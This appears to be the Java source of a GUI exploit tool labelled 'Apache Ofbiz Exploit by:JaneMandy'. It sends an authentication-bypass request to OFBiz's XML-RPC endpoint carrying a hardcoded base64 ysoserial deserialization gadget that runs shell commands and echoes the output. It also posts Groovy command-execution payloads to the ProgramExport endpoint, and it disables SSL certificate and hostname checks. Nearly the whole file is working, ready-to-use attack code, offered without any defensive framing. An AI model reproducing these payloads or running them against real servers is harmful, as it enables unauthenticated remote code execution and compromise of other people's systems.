package org.example;

import javax.net.ssl.HttpsURLConnection;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class UI {
    private JPanel root;
    private JTabbedPane tabbedPane1;
    private JTextField textField1;
    private JButton exploitButton;
    private JButton 代理Button;
    public JCheckBox 设置Host头CheckBox;
    public JRadioButton 使用TomcatEcho命令执行RadioButton;
    public JRadioButton 自选反序列化RadioButton;
    public JRadioButton 内存马RadioButton;
    public JTextField whoamiTextField;
    public JTextArea textArea1;
    public JTextArea textArea2;
    private JPanel deseri;
    private JPanel groovy;
    public JTextArea textArea3;
    public JRadioButton parameterErrorEchoRadioButton;
    public JRadioButton noEchoRadioButton;
    public JTextField textField2;
    private JRadioButton usePrintlnToEchoRadioButton;

    public UI() {
        HttpsPostRequestExample httpsPostRequest = new HttpsPostRequestExample();
        httpsPostRequest.UiObject= this;
        try {
            System.setProperty("jsse.enableSNIExtension", "false");
            httpsPostRequest.disableSSLVerification();
           // SSLContext sslContext = SSLContext.getInstance("SSL");
           // sslContext.init(null, new TrustManager[] { new CustomTrustManager() }, null);
            //HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());

        }catch (Exception error){
            JOptionPane.showMessageDialog(null,"初始化错误","警告",1);
            System.exit(-1);
        }

        使用TomcatEcho命令执行RadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                使用TomcatEcho命令执行RadioButton.setSelected(true);
                if(使用TomcatEcho命令执行RadioButton.isSelected()){
                    whoamiTextField.setEnabled(true);
                    textArea1.setEnabled(false);
                    自选反序列化RadioButton.setSelected(false);
                    内存马RadioButton.setSelected(false);
                }
            }
        });
        自选反序列化RadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                自选反序列化RadioButton.setSelected(true);
                if(自选反序列化RadioButton.isSelected()){
                    textArea1.setEnabled(true);
                    whoamiTextField.setEnabled(false);
                    使用TomcatEcho命令执行RadioButton.setSelected(false);
                    内存马RadioButton.setSelected(false);
                }
            }
        });
        内存马RadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                内存马RadioButton.setSelected(true);
                if(内存马RadioButton.isSelected()){
                    whoamiTextField.setEnabled(false);
                    textArea1.setEnabled(false);
                    自选反序列化RadioButton.setSelected(false);
                    使用TomcatEcho命令执行RadioButton.setSelected(false);
                }
            }
        });
        exploitButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                URL url =null;
                try {
                    url = new URL(textField1.getText().toString());
                    if(url.getProtocol().equals("https")) {
                        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
                        connection.setHostnameVerifier((hostname, session) -> true);

                    }

                    // 禁用主机名验证


                }catch (Exception error){
                    JOptionPane.showMessageDialog(null,"Please check if the URL is correct","Error",0);
                    return;
                }

                String protocol = url.getProtocol(); // 获取协议
                String host = url.getHost();         // 获取主机（域名或IP地址）
                int port = url.getPort();           // 获取端口号

                // 处理端口号
                if (port == -1) {
                    // 如果端口号为-1，则使用默认端口号，例如 HTTPS 默认端口为 443
                    port = url.getDefaultPort();
                }

                // 合并协议、主机和端口
                String combinedURL = protocol + "://" + host + ":" + port;

                if(deseri.isVisible()){
                   //反序列化
                    String PayloadStart = "<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">";
                    String PayloadEnd = "</serializable></value></member></struct></value></param></params></methodCall>";
                    String Payload = "";
                    if (使用TomcatEcho命令执行RadioButton.isSelected()){
                        Payload = PayloadStart + "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAF0/K/rq+AAAAMwEfBwEdAQAqeXNvc2VyaWFsL3BheWxvYWRzL3RlbXBsYXRlcy9Ub21jYXRDbWRFY2hvBwAEAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEACDxjbGluaXQ+AQADKClWAQAEQ29kZQoACQALBwAKAQAQamF2YS9sYW5nL1RocmVhZAwADAANAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7CgAJAA8MABAAEQEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwoAEwAVBwAUAQAQamF2YS9sYW5nL09iamVjdAwAFgAXAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7CAAZAQAHdGhyZWFkcwoAGwAdBwAcAQAPamF2YS9sYW5nL0NsYXNzDAAeAB8BABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7CgAhACMHACIBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAwAJAAlAQANc2V0QWNjZXNzaWJsZQEABChaKVYKACEAJwwAKAApAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsHACsBABNbTGphdmEvbGFuZy9UaHJlYWQ7CgAJAC0MAC4ALwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwgAMQEABGV4ZWMKADMANQcANAEAEGphdmEvbGFuZy9TdHJpbmcMADYANwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaCAA5AQAEaHR0cAgAOwEABnRhcmdldAcAPQEAEmphdmEvbGFuZy9SdW5uYWJsZQgAPwEABnRoaXMkMAgAQQEAB2hhbmRsZXIKABsAQwwARAAXAQANZ2V0U3VwZXJjbGFzcwgARgEABmdsb2JhbAgASAEACnByb2Nlc3NvcnMHAEoBAA5qYXZhL3V0aWwvTGlzdAsASQBMDAAoAE0BABUoSSlMamF2YS9sYW5nL09iamVjdDsIAE8BAANyZXEIAFEBAAtnZXRSZXNwb25zZQoAGwBTDABUAFUBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7CgBXAFkHAFgBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QMAFoAWwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwgAXQEACWdldEhlYWRlcggAXwEAA2NtZAoAMwBhDABiAGMBAAdpc0VtcHR5AQADKClaCABlAQAJc2V0U3RhdHVzCQBnAGkHAGgBABFqYXZhL2xhbmcvSW50ZWdlcgwAagBrAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7CgBnAG0MAG4AbwEABjxpbml0PgEABChJKVYIAHEBAAdvcy5uYW1lCgBzAHUHAHQBABBqYXZhL2xhbmcvU3lzdGVtDAB2AHcBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7CgAzAHkMAHoALwEAC3RvTG93ZXJDYXNlCAB8AQADd2luCAB+AQAHY21kLmV4ZQgAgAEAAi9jCACCAQAJL2Jpbi9iYXNoCACEAQACLWMHAIYBABFqYXZhL3V0aWwvU2Nhbm5lcgcAiAEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgoAhwCKDABuAIsBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWCgCHAI0MAI4AjwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7CgCRAJMHAJIBABFqYXZhL2xhbmcvUHJvY2VzcwwAlACVAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwoAhQCXDABuAJgBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAJoBAAJcQQoAhQCcDACdAJ4BAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsKAIUAoAwAoQAvAQAEbmV4dAoAMwCjDACkAKUBAAhnZXRCeXRlcwEABCgpW0IKAAEApwwAqACpAQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwgAqwEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawoAGwCtDACuAK8BAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwoAGwCxDACyALMBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7CAC1AQAIc2V0Qnl0ZXMHALcBAAJbQgoAGwC5DAC6AFUBABFnZXREZWNsYXJlZE1ldGhvZAgAvAEAB2RvV3JpdGUIAL4BABNqYXZhLm5pby5CeXRlQnVmZmVyCADAAQAEd3JhcAsASQDCDADDAMQBAARzaXplAQADKClJBwDGAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwDIAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAygEAE2phdmEvbGFuZy9FeGNlcHRpb24BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAARmbGFnAQABWgEABWdyb3VwAQAXTGphdmEvbGFuZy9UaHJlYWRHcm91cDsBAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAAWkBAAFJAQABdAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAA3N0cgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA29iagEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAWUBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAEExqYXZhL3V0aWwvTGlzdDsBAAFqAQAJcHJvY2Vzc29yAQAEcmVzcAEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQADY2xzAQAEdmFyNQEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAOkBABVqYXZhL2xhbmcvVGhyZWFkR3JvdXAHAOIKAAMA7AwAbgAGAQAEdGhpcwEALEx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL1RvbWNhdENtZEVjaG87AQAKRXhjZXB0aW9ucwgA8QEAEGphdmEudXRpbC5CYXNlNjQIAPMBAApnZXRFbmNvZGVyCAD1AQAOZW5jb2RlVG9TdHJpbmcIAPcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyCAD5AQAGZW5jb2RlBwD7AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIIAP0BABA8Y29tbWFuZF9yZXN1bHQ+CgD6AP8MAG4BAAEAFShMamF2YS9sYW5nL1N0cmluZzspVgoA+gECDAEDAQQBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsIAQYBABE8L2NvbW1hbmRfcmVzdWx0PgoA+gEIDAEJAC8BAAh0b1N0cmluZwEAAmJzAQAGYmFzZTY0AQAFdmFsdWUBAAdFbmNvZGVyAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwESAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQASVG9tY2F0Q21kRWNoby5qYXZhAQA5eXNvc2VyaWFsL3BheWxvYWRzL3RlbXBsYXRlcy9Ub21jYXRDbWRFY2hvOTA0MjQyMzQxNzgxOTgwAQA7THlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvVG9tY2F0Q21kRWNobzkwNDI0MjM0MTc4MTk4MDsAIQABAAMAAAAAAAUACAAFAAYAAQAHAAAFrAAIABEAAAL3Azu4AAi2AA5MK7YAEhIY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"+ PayloadEnd;

                    }else{
                        Payload = PayloadStart +textArea1.getText()+ PayloadEnd;

                    }
                    try {

                        String Resp = httpsPostRequest.sendXMLPayload(combinedURL + "/webtools/control/xmlrpc/?USERNAME&PASSWORD=admin&requirePasswordChange=Y", Payload);
                        //System.out.println(Resp);
                    }catch (Exception error){
                        textArea2.append("请求失败，请检查配置");
                        error.printStackTrace();
                    }



                }else if(groovy.isVisible()){
                    //命令执行
                    String Payload = "";
                    String input = httpsPostRequest.StringConversion(textField2.getText());
                    if(parameterErrorEchoRadioButton.isSelected()){
                        Payload = "import org.apache.ofbiz.entity.util.EntityFindOptions\n" +
                                "def custombaseEncode(String input) {\n" +
                                "    def baseChars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n" +
                                "    def result = \"\"\n" +
                                "\n" +
                                "    byte[] bytes = input.bytes\n" +
                                "\n" +
                                "    for (int i = 0; i < bytes.length; i += 3) {\n" +
                                "        int triple = (bytes[i] & 0xFF) << 16\n" +
                                "        if (i + 1 < bytes.length) triple |= (bytes[i + 1] & 0xFF) << 8\n" +
                                "        if (i + 2 < bytes.length) triple |= bytes[i + 2] & 0xFF\n" +
                                "\n" +
                                "        for (int j = 0; j < 4; j++) {\n" +
                                "            int index = (triple >> (18 - j * 6)) & 0x3F\n" +
                                "            result += baseChars.charAt(index)\n" +
                                "        }\n" +
                                "    }\n" +
                                "    while (result.length() % 4 != 0) {\n" +
                                "        result += \"=\"\n" +
                                "    }\n" +
                                "\n" +
                                "    return result\n" +
                                "}\n" +
                                "\n" +
                                "\n" +
                                "EntityFindOptions findOptions = new EntityFindOptions()\n" +
                                "findOptions.setMaxRows(3)\n" +
                                "def text =  (("+input+").execute().text.toString()) \n" +
                                "def result = \"<command_result>${custombaseEncode(text)}</command_result>\"\n" +
                                "List products = delegator.findList(result, null, null, null, findOptions, false)\n";
                    }else if(noEchoRadioButton.isSelected()){
                        Payload = "import groovy.lang.GroovyShell;\n" +
                                "\n" +
                                "String expression = \"("+input+").execute()\";\n" +
                                "GroovyShell gs = new GroovyShell();\n" +
                                "gs.evaluate(expression);";
                    }else if(parameterErrorEchoRadioButton.isSelected()){
                        Payload = "println ("+input+").execute().text";
                    }
                    try {


                        String Resp = httpsPostRequest.sendGroovy(combinedURL + "/webtools/control/ProgramExport?USERNAME=&PASSWORD=aaaa&requirePasswordChange=Y", "groovyProgram="+URLEncoder.encode(Payload, "UTF-8"));
                    }catch (Exception error){
                        error.printStackTrace();

                    }
                }
            }
        });
        parameterErrorEchoRadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                parameterErrorEchoRadioButton.setSelected(true);
                if(parameterErrorEchoRadioButton.isSelected()) {
                    noEchoRadioButton.setSelected(false);
                    usePrintlnToEchoRadioButton.setSelected(false);
                }
            }
        });
        noEchoRadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                noEchoRadioButton.setSelected(true);
                if(noEchoRadioButton.isSelected()) {
                    usePrintlnToEchoRadioButton.setSelected(false);
                    parameterErrorEchoRadioButton.setSelected(false);
                }
            }
        });
        usePrintlnToEchoRadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                usePrintlnToEchoRadioButton.setSelected(true);
                if(usePrintlnToEchoRadioButton.isSelected()) {
                    noEchoRadioButton.setSelected(false);
                    parameterErrorEchoRadioButton.setSelected(false);
                }
            }
        });
        代理Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JFrame frame = new JFrame("Proxy");

                frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                frame.setContentPane(new Proxy_GUI().panel1);

                frame.setLocationRelativeTo(null);
                frame.pack();
                GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
                Point center = ge.getCenterPoint();
                frame.setLocation(center.x - frame.getWidth() / 2, center.y - frame.getHeight() / 2);


                frame.setVisible(true);
            }
        });
    }

    public static void main(String[] args) {

        JFrame frame = new JFrame("Apache Ofbiz Exploit by:JaneMandy");

        frame.setContentPane(new UI().root);

        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        frame.pack();
        frame.setSize(800,600);
        GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        Point center = ge.getCenterPoint();
        frame.setLocation(center.x - frame.getWidth() / 2, center.y - frame.getHeight() / 2);

        frame.setVisible(true);
    }
}
